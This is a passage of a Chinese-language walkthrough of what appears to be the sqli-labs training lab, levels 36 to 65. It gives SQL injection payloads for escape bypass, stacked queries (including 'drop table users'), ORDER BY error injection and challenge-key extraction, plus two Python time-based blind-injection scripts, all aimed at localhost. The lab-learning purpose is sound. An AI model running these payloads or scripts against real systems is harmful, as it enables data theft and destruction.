<h3 id="36-Bypass-MySQL-Real-Escape-String"><a href="#36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="36 Bypass MySQL Real Escape String"></a>36 Bypass MySQL Real Escape String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用了<code>mysql_real_escape_string</code>来过滤输入，转义 SQL 语句中使用的字符串中的特殊字符。</p>
<p>下列字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
<p>套路同上</p>
<h3 id="37-MySQL-real-escape-string"><a href="#37-MySQL-real-escape-string" class="headerlink" title="37 MySQL_real_escape_string"></a>37 MySQL_real_escape_string</h3><p><code>uname=1%df&#39;+union+select+database(),2%23&amp;passwd=1</code></p>
<p>post传参,依然是用Burpsuite,套路同上</p>
<h3 id="38-stacked-Query"><a href="#38-stacked-Query" class="headerlink" title="38 stacked Query"></a>38 stacked Query</h3><p>引出堆叠注入的内容，没有其他特殊的</p>
<p><code>1&#39;; create table test like users;%23</code></p>
<p><code>1&#39;; drop table users;%23</code></p>
<h2 id="Stacked-Injections"><a href="#Stacked-Injections" class="headerlink" title="Stacked Injections"></a>Stacked Injections</h2><h3 id="39-stacked-Query-Intiger-type"><a href="#39-stacked-Query-Intiger-type" class="headerlink" title="39 stacked Query Intiger type"></a>39 stacked Query Intiger type</h3><p>同38 改成整型</p>
<p><code>1; create table test like users;%23</code></p>
<p>…</p>
<h3 id="40-stacked-Query-String-type-Blind"><a href="#40-stacked-Query-String-type-Blind" class="headerlink" title="40 stacked Query String type Blind"></a>40 stacked Query String type Blind</h3><p>经典换汤不换药</p>
<p>闭合改成 <code>&#39;)</code></p>
<h3 id="41-stacked-Query-Intiger-type-blind"><a href="#41-stacked-Query-Intiger-type-blind" class="headerlink" title="41 stacked Query Intiger type blind"></a>41 stacked Query Intiger type blind</h3><p>同上 改成整型 多了个报错而已。</p>
<h3 id="42-Stacked-Query-error-based"><a href="#42-Stacked-Query-error-based" class="headerlink" title="42 Stacked Query error based"></a>42 Stacked Query error based</h3><p>账号被过滤 密码没有，在密码里写堆叠注入</p>
<p>账号随便写</p>
<p>密码:<code>a&#39; create table test like users;%23</code></p>
<p>密码:<code>a&#39; drop table test;%23</code></p>
<h3 id="43-Stacked-Query"><a href="#43-Stacked-Query" class="headerlink" title="43 Stacked Query"></a>43 Stacked Query</h3><p>同上 闭合换<code>&#39;)</code></p>
<h3 id="44-Stacked-Query-Blind"><a href="#44-Stacked-Query-Blind" class="headerlink" title="44 Stacked Query Blind"></a>44 Stacked Query Blind</h3><p>同上 闭合<code>&#39;</code></p>
<p>(所谓blind就是没错误回显</p>
<h3 id="45-Stacked-Query-Blind"><a href="#45-Stacked-Query-Blind" class="headerlink" title="45 Stacked Query Blind"></a>45 Stacked Query Blind</h3><p>同上 闭合<code>&#39;)</code></p>
<h3 id="46-ORDER-BY-Error-Numeric"><a href="#46-ORDER-BY-Error-Numeric" class="headerlink" title="46 ORDER BY-Error-Numeric"></a>46 ORDER BY-Error-Numeric</h3><p>查询语句:<code>SELECT * FROM users ORDER BY $id</code></p>
<p>这题要提供的参数是<code>order by</code>后面的字段</p>
<p>报错注入可行: <code>1 and updatexml(0,concat(0x7e,database()),0)%23</code></p>
<p><code>1 and updatexml(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0)%23</code><br>…</p>
<h3 id="47-ORDER-BY-Clause-Error-Single-quote"><a href="#47-ORDER-BY-Clause-Error-Single-quote" class="headerlink" title="47 ORDER BY Clause-Error-Single quote"></a>47 ORDER BY Clause-Error-Single quote</h3><p>闭合<code>&#39;</code>，其余同上</p>
<p><code>1&#39; and updatexml(0,concat(0x7e,database()),0)%23</code></p>
<h3 id="48-ORDER-BY-Clause-Blind-based"><a href="#48-ORDER-BY-Clause-Blind-based" class="headerlink" title="48 ORDER BY Clause Blind based"></a>48 ORDER BY Clause Blind based</h3><p>把报错删了，可以盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BLIND INJECT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_inject</span>(<span class="params">url, loc, mid, comp=<span class="string">&#x27;&gt;&#x27;</span>, target=<span class="string">&#x27;database()&#x27;</span></span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;sort&#x27;</span>: <span class="string">f&quot;1 and if(ascii(substr(<span class="subst">&#123;target&#125;</span>,<span class="subst">&#123;loc&#125;</span>,1))<span class="subst">&#123;comp&#125;</span><span class="subst">&#123;mid&#125;</span>, sleep(0.02),0); -- &quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    time_start = time.time()</span><br><span class="line">    req = requests.get(url=url, params=params)</span><br><span class="line">    time_end = time.time()</span><br><span class="line">    <span class="keyword">if</span> time_end - time_start &gt; <span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/Less-48/&quot;</span></span><br><span class="line"><span class="comment"># target = &quot;database()&quot;</span></span><br><span class="line">target = <span class="string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># target = &quot;(select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;)&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">end = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> blind_inject(url, i, mid, target=target):</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check end</span></span><br><span class="line">        <span class="keyword">if</span> l &gt;= r:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> blind_inject(url, i, l, <span class="string">&#x27;=&#x27;</span>, target=target):</span><br><span class="line">                end = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> end:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h3 id="49-ORDER-BY-Clause-Blind-based"><a href="#49-ORDER-BY-Clause-Blind-based" class="headerlink" title="49 ORDER BY Clause Blind based"></a>49 ORDER BY Clause Blind based</h3><p>同上 闭合改成单引号</p>
<h3 id="50-ORDER-BY-Clause-Stacked-injection"><a href="#50-ORDER-BY-Clause-Stacked-injection" class="headerlink" title="50 ORDER BY Clause Stacked injection"></a>50 ORDER BY Clause Stacked injection</h3><p>mysql请求语句用的是<code>mysqli_multi_query</code>，可以堆叠注入</p>
<p><code>1;create table test like users;%23</code></p>
<p><code>1;drop table test;%23</code></p>
<h3 id="51-ORDER-BY-Clause-Stacked-injection"><a href="#51-ORDER-BY-Clause-Stacked-injection" class="headerlink" title="51 ORDER BY Clause Stacked injection"></a>51 ORDER BY Clause Stacked injection</h3><p>单引号闭合</p>
<p><code>1&#39;;create table test like users;%23</code></p>
<p><code>1&#39;;drop table test;%23</code></p>
<h3 id="52-ORDER-BY-Clause-Stacked-injection"><a href="#52-ORDER-BY-Clause-Stacked-injection" class="headerlink" title="52 ORDER BY Clause Stacked injection"></a>52 ORDER BY Clause Stacked injection</h3><p>无报错版本依葫芦画瓢</p>
<p>整型</p>
<h3 id="53-ORDER-BY-Clause-Stacked-injection"><a href="#53-ORDER-BY-Clause-Stacked-injection" class="headerlink" title="53 ORDER BY Clause Stacked injection"></a>53 ORDER BY Clause Stacked injection</h3><p>无报错版本依葫芦画瓢</p>
<p>单引号闭合</p>
<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="54-Challengs-1"><a href="#54-Challengs-1" class="headerlink" title="54 Challengs-1"></a>54 Challengs-1</h3><p><code>?id=1</code></p>
<p><code>?id=1&#39;</code></p>
<p><code>?id=1&#39; order by 4;%23</code></p>
<p><code>?id=1&#39; order by 3;%23</code></p>
<p><code>?id=-1&#39; union select 1,2,3;%23</code></p>
<p><code>?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata);%23</code></p>
<p><code>?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;);%23</code></p>
<p><code>?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;HBGWD6KDWA&#39;);%23</code></p>
<p><code>?id=-1&#39; union select 1,2,(select group_concat(secret_VXO7) from challenges.HBGWD6KDWA);%23</code></p>
<p>拿到key</p>
<h3 id="55-Challengs-1"><a href="#55-Challengs-1" class="headerlink" title="55 Challengs-1"></a>55 Challengs-1</h3><p>闭合改成<code>)</code><br>同上</p>
<h3 id="56-Challengs-1"><a href="#56-Challengs-1" class="headerlink" title="56 Challengs-1"></a>56 Challengs-1</h3><p>闭合改成<code>&#39;)</code><br>同上</p>
<h3 id="57-Challengs-1"><a href="#57-Challengs-1" class="headerlink" title="57 Challengs-1"></a>57 Challengs-1</h3><p>闭合改成<code>&quot;</code><br>同上</p>
<h3 id="58-Challengs-2"><a href="#58-Challengs-2" class="headerlink" title="58 Challengs-2"></a>58 Challengs-2</h3><p><code>?id=-1&#39; and updatexml(0,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),0);%23</code></p>
<p><code>?id=-1&#39; and updatexml(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;)),0);%23</code></p>
<p><code>?id=-1&#39; and updatexml(0,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;RB8A94YYQK&#39;)),0);%23</code></p>
<p><code>?id=-1&#39; and updatexml(0,concat(0x7e,(select group_concat(secret_AQ5T) from challenges.RB8A94YYQK)),0);%23</code></p>
<p>拿到key</p>
<h3 id="59-Challengs-2"><a href="#59-Challengs-2" class="headerlink" title="59 Challengs-2"></a>59 Challengs-2</h3><p>闭合改成整型<br>同上</p>
<h3 id="60-Challengs-2"><a href="#60-Challengs-2" class="headerlink" title="60 Challengs-2"></a>60 Challengs-2</h3><p>闭合改成<code>&quot;)</code><br>同上</p>
<h3 id="61-Challengs-2"><a href="#61-Challengs-2" class="headerlink" title="61 Challengs-2"></a>61 Challengs-2</h3><p>闭合改成<code>))</code><br>同上</p>
<h3 id="62-Challengs-3"><a href="#62-Challengs-3" class="headerlink" title="62 Challengs-3"></a>62 Challengs-3</h3><p>盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BLINE INJECT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># uname=admin&#x27; and if(ascii(substr(select (database())),&#123;&#125;,1),sleep(1),0);--+&amp;passwd=123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_inject</span>(<span class="params">url, loc, mid, comp=<span class="string">&#x27;&gt;&#x27;</span>, target=<span class="string">&#x27;database()&#x27;</span></span>):</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;1&#x27;) and if(ascii(substr(<span class="subst">&#123;target&#125;</span>,<span class="subst">&#123;loc&#125;</span>,1))<span class="subst">&#123;comp&#125;</span><span class="subst">&#123;mid&#125;</span>, sleep(0.04),0); -- &quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    time_start = time.time()</span><br><span class="line">    req = requests.get(url=url, params=params)</span><br><span class="line">    time_end = time.time()</span><br><span class="line">    <span class="keyword">if</span> time_end - time_start &gt; <span class="number">0.03</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost/Less-62/&quot;</span></span><br><span class="line"><span class="comment"># target = &quot;database()&quot;</span></span><br><span class="line"><span class="comment"># target = &quot;(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># target = &quot;(select group_concat(column_name) from information_schema.columns where table_name=&#x27;EUA0BMHZ9V&#x27;)&quot;</span></span><br><span class="line">target = <span class="string">&quot;(select group_concat(secret_WC6I) from challenges.EUA0BMHZ9V)&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">end = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> blind_inject(url, i, mid, target=target):</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check end</span></span><br><span class="line">        <span class="keyword">if</span> l &gt;= r:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> blind_inject(url, i, l, <span class="string">&#x27;=&#x27;</span>, target=target):</span><br><span class="line">                end = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> end:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>


<h3 id="63-Challengs-3"><a href="#63-Challengs-3" class="headerlink" title="63 Challengs-3"></a>63 Challengs-3</h3><p>闭合改成<code>&#39;</code><br>同上</p>
<h3 id="64-Challengs-3"><a href="#64-Challengs-3" class="headerlink" title="64 Challengs-3"></a>64 Challengs-3</h3><p>闭合改成<code>))</code><br>同上</p>
<h3 id="65-Challengs-3"><a href="#65-Challengs-3" class="headerlink" title="65 Challengs-3"></a>65 Challengs-3</h3><p>闭合改成<code>)</code><br>同上</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archive</a></li>
         
          <li><a href="/categories/">categories</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/m4o9">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Basic-Challenges"><span class="toc-number">1.</span> <span class="toc-text">Basic Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-Error-Based-Single-quotes"><span class="toc-number">1.0.1.</span> <span class="toc-text">01-Error Based-Single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-Error-Based-Integer-based"><span class="toc-number">1.0.2.</span> <span class="toc-text">02-Error Based-Integer based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-Error-Based-Single-quotes-with-twist"><span class="toc-number">1.0.3.</span> <span class="toc-text">03-Error Based-Single quotes with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-Error-Based-Double-quotes"><span class="toc-number">1.0.4.</span> <span class="toc-text">04-Error Based-Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-Double-injections-Single-quotes"><span class="toc-number">1.0.5.</span> <span class="toc-text">05-Double injections-Single quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-Double-injections-Double-quotes"><span class="toc-number">1.0.6.</span> <span class="toc-text">06-Double injections-Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-Dump-into-outfile"><span class="toc-number">1.0.7.</span> <span class="toc-text">07-Dump into outfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-Blind-Boolian-Single-Quotes"><span class="toc-number">1.0.8.</span> <span class="toc-text">08-Blind-Boolian-Single Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#09-Blind-Time-based-Single-Quotes"><span class="toc-number">1.0.9.</span> <span class="toc-text">09-Blind-Time based-Single Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-Blind-Time-based-Double-Quotes"><span class="toc-number">1.0.10.</span> <span class="toc-text">10-Blind-Time based-Double Quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-POST-Error-based"><span class="toc-number">1.0.11.</span> <span class="toc-text">11-POST-Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-Error-Based-Double-quotes"><span class="toc-number">1.0.12.</span> <span class="toc-text">12-Error Based-Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-Double-Injection-String-with-twist"><span class="toc-number">1.0.13.</span> <span class="toc-text">13-Double Injection- String- with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-Double-Injection-Double-quotes-String"><span class="toc-number">1.0.14.</span> <span class="toc-text">14-Double Injection- Double quotes- String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-Blind-Boolian-Based-String"><span class="toc-number">1.0.15.</span> <span class="toc-text">15-Blind- Boolian Based- String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-Blind-Time-Based-Double-quotes-String"><span class="toc-number">1.0.16.</span> <span class="toc-text">16-Blind- Time Based- Double quotes- String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-Update-Query-Error-based-String"><span class="toc-number">1.0.17.</span> <span class="toc-text">17-Update Query- Error based - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-Header-Injection-Error-Based-string"><span class="toc-number">1.0.18.</span> <span class="toc-text">18-Header Injection- Error Based- string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-Header-Injection-Referer-Error-Based-string"><span class="toc-number">1.0.19.</span> <span class="toc-text">19-Header Injection- Referer- Error Based- string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-Cookie-Injection-Error-Based-string"><span class="toc-number">1.0.20.</span> <span class="toc-text">20-Cookie Injection- Error Based- string</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Advanced-Injections"><span class="toc-number">2.</span> <span class="toc-text">Advanced Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-Cookie-Injection-Error-Based-complex-string"><span class="toc-number">2.0.1.</span> <span class="toc-text">21-Cookie Injection- Error Based- complex - string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-Cookie-Injection-Error-Based-Double-Quotes-string"><span class="toc-number">2.0.2.</span> <span class="toc-text">22-Cookie Injection- Error Based- Double Quotes - string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-Error-Based-no-comments"><span class="toc-number">2.0.3.</span> <span class="toc-text">23-Error Based- no comments</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-Second-Degree-Injections"><span class="toc-number">2.0.4.</span> <span class="toc-text">24-Second Degree Injections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-Trick-with-OR-amp-AND"><span class="toc-number">2.0.5.</span> <span class="toc-text">25 Trick with OR &amp; AND</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25a-Trick-with-OR-amp-AND-Blind"><span class="toc-number">2.0.6.</span> <span class="toc-text">25a-Trick with OR &amp; AND Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26-Trick-with-comments"><span class="toc-number">2.0.7.</span> <span class="toc-text">26 Trick with comments</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#26a-Trick-with-comments"><span class="toc-number">2.0.8.</span> <span class="toc-text">26a Trick with comments</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-Trick-with-SELECT-amp-UNION"><span class="toc-number">2.0.9.</span> <span class="toc-text">27 Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#27-Trick-with-SELECT-amp-UNION-1"><span class="toc-number">2.0.10.</span> <span class="toc-text">27 Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-Trick-with-SELECT-amp-UNION"><span class="toc-number">2.0.11.</span> <span class="toc-text">28 Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28a-Trick-with-SELECT-amp-UNION"><span class="toc-number">2.0.12.</span> <span class="toc-text">28a Trick with SELECT &amp; UNION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#29-31-WAF%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.13.</span> <span class="toc-text">29-31 WAF绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-Bypass-addslashes"><span class="toc-number">2.0.14.</span> <span class="toc-text">32 Bypass addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-Bypass-addslashes"><span class="toc-number">2.0.15.</span> <span class="toc-text">33 Bypass addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-Bypass-Add-SLASHES"><span class="toc-number">2.0.16.</span> <span class="toc-text">34 Bypass Add SLASHES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-why-care-for-addslashes"><span class="toc-number">2.0.17.</span> <span class="toc-text">35 why care for addslashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#36-Bypass-MySQL-Real-Escape-String"><span class="toc-number">2.0.18.</span> <span class="toc-text">36 Bypass MySQL Real Escape String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#37-MySQL-real-escape-string"><span class="toc-number">2.0.19.</span> <span class="toc-text">37 MySQL_real_escape_string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#38-stacked-Query"><span class="toc-number">2.0.20.</span> <span class="toc-text">38 stacked Query</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stacked-Injections"><span class="toc-number">2.1.</span> <span class="toc-text">Stacked Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#39-stacked-Query-Intiger-type"><span class="toc-number">2.1.1.</span> <span class="toc-text">39 stacked Query Intiger type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#40-stacked-Query-String-type-Blind"><span class="toc-number">2.1.2.</span> <span class="toc-text">40 stacked Query String type Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#41-stacked-Query-Intiger-type-blind"><span class="toc-number">2.1.3.</span> <span class="toc-text">41 stacked Query Intiger type blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-Stacked-Query-error-based"><span class="toc-number">2.1.4.</span> <span class="toc-text">42 Stacked Query error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-Stacked-Query"><span class="toc-number">2.1.5.</span> <span class="toc-text">43 Stacked Query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44-Stacked-Query-Blind"><span class="toc-number">2.1.6.</span> <span class="toc-text">44 Stacked Query Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#45-Stacked-Query-Blind"><span class="toc-number">2.1.7.</span> <span class="toc-text">45 Stacked Query Blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#46-ORDER-BY-Error-Numeric"><span class="toc-number">2.1.8.</span> <span class="toc-text">46 ORDER BY-Error-Numeric</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#47-ORDER-BY-Clause-Error-Single-quote"><span class="toc-number">2.1.9.</span> <span class="toc-text">47 ORDER BY Clause-Error-Single quote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#48-ORDER-BY-Clause-Blind-based"><span class="toc-number">2.1.10.</span> <span class="toc-text">48 ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#49-ORDER-BY-Clause-Blind-based"><span class="toc-number">2.1.11.</span> <span class="toc-text">49 ORDER BY Clause Blind based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#50-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.12.</span> <span class="toc-text">50 ORDER BY Clause Stacked injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#51-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.13.</span> <span class="toc-text">51 ORDER BY Clause Stacked injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.14.</span> <span class="toc-text">52 ORDER BY Clause Stacked injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53-ORDER-BY-Clause-Stacked-injection"><span class="toc-number">2.1.15.</span> <span class="toc-text">53 ORDER BY Clause Stacked injection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenges"><span class="toc-number">2.2.</span> <span class="toc-text">Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#54-Challengs-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">54 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#55-Challengs-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">55 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#56-Challengs-1"><span class="toc-number">2.2.3.</span> <span class="toc-text">56 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#57-Challengs-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">57 Challengs-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#58-Challengs-2"><span class="toc-number">2.2.5.</span> <span class="toc-text">58 Challengs-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#59-Challengs-2"><span class="toc-number">2.2.6.</span> <span class="toc-text">59 Challengs-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#60-Challengs-2"><span class="toc-number">2.2.7.</span> <span class="toc-text">60 Challengs-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#61-Challengs-2"><span class="toc-number">2.2.8.</span> <span 